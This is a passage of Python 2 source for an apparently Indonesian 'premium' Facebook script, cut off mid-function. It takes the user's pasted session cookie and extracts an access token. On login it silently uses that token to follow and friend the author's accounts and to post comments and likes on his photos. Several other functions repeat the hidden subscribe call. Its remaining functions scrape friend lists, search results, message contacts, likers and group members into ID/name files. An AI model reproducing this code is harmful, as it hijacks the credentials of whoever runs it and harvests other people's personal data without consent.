#-*-coding:utf-8-*-
import requests,bs4,sys,os,subprocess,time,datetime
import requests,sys,random,re,base64,json
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from menu_instagram import menu_instagram
from menu_instagram import menu_instagram
from urllib2 import urlopen
from cek_opsi import cek_opsi
reload(sys)
sys.setdefaultencoding("utf-8")
"""   Terimaksih Untuk Semuanya   """
#####################################


"""
Pastikan Jangan Ubah Bot Follownya !
Kalo Mau Tinggal Tambahin Faham?
Dan Jika Ingin Di Ganti Izin Dulu :v
 				  """


#####################################
logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
\x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
\x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
\x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_|
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : Bangsat
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/Bangsat.XD
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/Bangsat-XD
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
""")
hostm=("https://m.facebook.com")
url=('http://ipinfo.io/json')
response=urlopen(url)
data=json.load(response)
ip=data['ip']
org=data['org']
region=data['region']
country=requests.get("https://ipapi.com/ip_api.php?ip="+ip,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"]
ua=random.choice(["Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"])
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
uac=("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
def basecookie():
	if os.path.exists("_____bangsat_____"):
		if os.path.getsize("_____bangsat_____") !=0:
			return gets_dict_cookies(open('_____bangsat_____').read().strip())
		else:login()
	else:login()
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
def hdcok():
	global hostm,uac
	hosts=hostm
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": uac, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def login():
	os.system('clear')
	print(logo)
	print("\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Pakai Cookie")
	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Cara Dapat Cookie")
	print("\x1b[1;92m[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m Keluar")
	login = raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m] Choose :\x1b[1;96m ")
	if login == "":
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
	elif login == "1":
		try:
			cookie = raw_input("\x1b[1;92m[\x1b[1;96m*\x1b[1;92m]\x1b[1;96m Cookie :\x1b[1;93m ")
	                data = {
	                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
	                                'referer' : 'https://m.facebook.com/',
	                                'host' : 'm.facebook.com',
	                                'origin' : 'https://m.facebook.com',
	                                'upgrade-insecure-requests' : '1',
	                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	                                'cache-control' : 'max-age=0',
	                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	                                'content-type' : 'text/html; charset=utf-8',
	                                 'cookie' : cookie }
	                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        	        cari = re.search('(EAAA\w+)', coki.text)
	                hasil = cari.group(1)
	                cok = open('_____bangsat_____', 'w')
	                cok.write(cookie)
	                cok.close()
	                tok = open('___bangsat___', 'w')
	                tok.write(hasil)
	                tok.close()
	                bot_follow()
	        except AttributeError,UnboundLocalError:
	                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Salah')
	                time.sleep(2)
	                login()
		except requests.exceptions.ConnectionError:
			exit("\x1b[1;92m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Koneksi Error")
	elif login == "2":
		print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
		time.sleep(3)
		os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
		exit()
	elif login == "0":
		exit()
	else:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
def cek_cookie():
	cvds=None
        new=None
        if cek(1)==False:
                try:
                        cookie=cvd(open("_____bangsat_____").read().strip())
                        cvds=cvd(cookie)
                        new=True
                except:
                        print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
        else:
                cvds=cvd(open("_____bangsat_____").read().strip())
        r=requests.get("https://mbasic.facebook.com/profile.php",
                cookies=cvds,
        headers=hdcok()).text
        if len(bs4.re.findall("logout",r)) !=0:
		print('\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mengecek Cookie')
		time.sleep(2)
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selamat Datang :\x1b[1;93m %s"%(
                        bs4.BeautifulSoup(r,
                "html.parser").find("title").text[0:20]))
		time.sleep(3)
		menu()
	else:
                try:
                        os.remove("_____bangsat_____")
                except:
                        pass
                print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
def bot_follow():
	try:
		token=open('___bangsat___','r').read()
	except IOError:
		print ("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mCookie Invalid")
		os.system('rm -rf ___bangsat___')
		time.sleep(2)
		login()
	web = datetime.datetime.now()
        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
	kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
	kata_utama = ("Pengguna Script Premium ")
	komen = kata_utama+love+"\n"+kata_kata_cinta+"\n"+waktu
	kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
	kata_utama2 = random.choice(["Hai Bang 😎","Hello Bang 😎","Hello Bro 😎","Hai Bro 😎"])
	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Parang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
	kata_utama3 = ("I love you @[757953543:]")
	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100064814153036&access_token='+token) #Rozhak
	requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token) #Rozhak
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token='+token) #Muhammad Rozhak
	requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token='+token) #Rozhak
	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen+'&access_token='+token) #Foto Profil
	requests.post('https://graph.facebook.com/10159494942223544/likes?summary=true&access_token='+token) #Foto Profil
	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen3+'&access_token='+token) # Foto Profil
	requests.post('https://graph.facebook.com/10158807643598544/comments/?message='+komen2+'&access_token='+token) #Foto Sampul
	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil")
	menu()
def publik_fast():
        try:
                token=open('___bangsat___','r').read()
        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookies Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                        op = json.loads(req.text)
                        print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
                except KeyError:
                        print('\x1b[1;91m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
                r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
                id = []
                z=json.loads(r.text)
                fle = open(file , 'a')#.replace(" ","_")
                for a in z['friends']['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
                print("\r\x1b[1;92m                     ")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                menu()

        except KeyError:
                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m]\x1b[1;93m Koneksi Error")
class friendlist:

    def __init__(self, cookie):
        self.nitel = None
        self.cookie = cookie
	user = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Username :\x1b[1;96m ")
        self.id = ("https://www.facebook.com/"+user)
        if self.id == '':
            friendlist(cookie)
        else:
            self.fl = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
            open(self.fl, 'a+')
            id = ('').join(bs4.re.findall('://(.*?)/', self.id))
            if len(id) == 0:
                friendlist(cookie)
            self.ok = bs4.re.sub(id, 'm.facebook.com', self.id).replace('profile.php?id=', '') + '?v=friends'
            self.dump(self.ok)
        return

    def dump(self, ok):
        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), cookies=self.cookie).text, 'html.parser')
        if self.nitel == None:
            a = r.find('title').text[0:20]
            self.nitel = a
            b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
            self.b = b
            print('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m %s' % a)
        for i in r.find_all('a', href=True):
            if 'fref' in i.get('href'):
                print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;97m/\x1b[1;96m%s \x1b[1;92mID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop" % (len(open(self.fl).read().splitlines()), self.b),;sys.stdout.flush();time.sleep(0.007)
                if 'profile_add_friend.php' in i.get('href'):
                    continue
                elif 'profile.php' in i.get('href'):
                    ag = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
                else:
                    ag = ('').join(bs4.re.findall('/(.*?)\\?', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
            if 'lihat teman lain' in i.text.lower():
                __import__('time').sleep(0.1)
                while True:
                    try:
                        self.dump('https://m.facebook.com/' + i.get('href'))
                        __import__('time').sleep(0.1)
                        break
                    except Exception as e:
                        print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Dump Gagal %s' % e)
                        continue
	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+self.fl)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;92m}")
	menu()
        return
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(requests.get(
		b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop"%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))

		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+fl)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
	menu()
def cek(arg):
	if os.path.exists("_____bangsat_____"):
		if os.path.getsize("_____bangsat_____") !=0:
			return True
		else:return False
	else:return False
def dumpfl():
	cvds=None
	new=None
	if cek(1)==False:
		try:
			cookie=cvd(open("_____bangsat_____").read().strip())
			cvds=cvd(cookie)
			new=True
		except:
			print("[•] Cookie Invalid");login()
	else:
		cvds=cvd(open("_____bangsat_____").read().strip())
	r=requests.get("https://mbasic.facebook.com/profile.php",
		cookies=cvds,
	headers=hdcok()).text
	if len(bs4.re.findall("logout",r)) !=0:
		if new==True:
			open("_____bangsat_____","w").write(cookie)
		s=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ")
		fl=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
		search(
			fl,cvds,
		"https://m.facebook.com/search/people/?q="+s)
	else:
		try:
			os.remove("_____bangsat_____")
		except:
			pass
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
class dump_message:

    def __init__(self, cookies):
        self.cookies = cookies
        self.f = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
        if self.f == '':
            dump_message(cookies)
        open(self.f, 'w').close()
        self.dump('https://m.facebook.com/messages')

    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                            print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop" % len(open(self.f).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)

                except Exception as e:
		    print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Dump Gagal %s' % e)
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://m.facebook.com/' + i.get('href'))

	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+self.f)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
	menu()
def like_post():
        try:
                token=open('___bangsat___','r').read()
        except IOError:
		print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Post ID :\x1b[1;96m ")
                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                except KeyError:
			print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Post ID Tidak Ada')
			raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
                id = []
                z=json.loads(r.text)
                fle = open(file , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
		print("\r\x1b[1;97m                   ")
		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
		raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
		menu()

	except requests.exceptions.ConnectionError:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Koneksi Error")
class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 
                       'name': i.text})

        if len(self.glist) != 0:
            print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Anda Memiliki\x1b[1;96m %s\x1b[1;92m Grup' % len(self.glist))
            print('\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Dapatkan Grup Dari Cari Nama')
            print('\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Masukan ID Grup\x1b[1;92m/\x1b[1;97mManual')
            while True:
                c = raw_input(' \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ')
                if c == '':
                    continue
                elif c == '1':
                    self.search()
                    exit()
                elif c == '2':
                    self.manual()
                    exit()
                else:
		    exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")

        else:
            exit('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Grub Tidak Ditemukan')

    def manual(self):
        id = raw_input('\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Grub ID :\x1b[1;96m ')
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Grub ID Tidak Valid\x1b[1;93m/\x1b[1;91mAnda Belum Bergabung Grup')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama Grub :\x1b[1;96m %s' % self.listed.get('name')[0:15])
                self.dumps('https://m.facebook.com/groups/' + id)

    def search(self):
        whitelist = []
        q = raw_input('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Grup Name :\x1b[1;96m ').lower()
        if q == '':
            self.search()
        else:
            for e, i in enumerate(self.glist):
                if q in i.get('name').lower():
                    whitelist.append(i)
                    print '\x1b[1;92m [\x1b[1;97m%s\x1b[1;92m]\x1b[1;97m %s' % (
                     len(whitelist),
                     i.get('name').lower().replace(q, '%s' % (q)))

            if len(whitelist) == 0:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Hasil Untuk :\x1b[1;93m %s' % q)
                self.search()
            else:
                print("\x1b[1;97m ")
                self.choice(whitelist)

    def choice(self, whitelist):
        try:
            self.listed = whitelist[(input('\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Pilih Grup :\x1b[1;96m ') - 1)]
            self.f()
            print('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m %s' % self.listed.get('name'))
            self.dumps('https://m.facebook.com/groups/' + self.listed.get('id'))
        except Exception as e:
            print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Dump Error %s' % e)
            self.choice(whitelist)

    def f(self):
        self.fl = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
        if self.fl == '':
            self.fl()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;97m ID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop\r" % len(open(self.fl).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print('\r\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m %s\x1b[1;97m,\x1b[1;93m Mencoba Lagi' % e)
                        continue

	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+self.fl)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
	menu()
def follower():
        try:
                token=open('___bangsat___','r').read()
